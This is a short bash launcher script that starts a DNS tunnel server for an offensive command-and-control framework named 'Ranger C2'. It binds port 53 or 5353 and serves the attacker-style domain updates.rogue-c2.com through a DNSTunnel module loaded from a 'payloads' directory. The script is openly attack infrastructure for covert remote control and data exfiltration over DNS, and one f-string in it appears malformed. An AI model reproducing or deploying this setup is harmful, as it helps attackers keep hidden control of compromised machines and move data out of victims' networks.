#!/bin/bash
# DNS Tunnel Startup Script

echo "Starting DNS Tunnel for Ranger C2..."

# Check if port 53 is available
if sudo lsof -i :53 > /dev/null 2>&1; then
    echo "⚠️ Port 53 is already in use"
    echo "Trying port 5353 instead..."
    PORT=5353
else
    PORT=53
fi

# Start DNS tunnel
cd "$(dirname "$0")"
python3 -c "
import sys
sys.path.append('.')
sys.path.append('./payloads')

try:
    from dnstunnel import DNSTunnel
    
    tunnel = DNSTunnel(
        domain='updates.rogue-c2.com',
        mode='server',
        listen_ip='0.0.0.0',
        listen_port=$PORT
    )
    
    print(f'[+] DNS tunnel server starting on port {$PORT}')
    print(f'[+] Domain: *.updates.rogue-c2.com')
    
    tunnel.start_server()
except Exception as e:
    print(f'[!] DNS server error: {e}')
    import traceback
    traceback.print_exc()
"
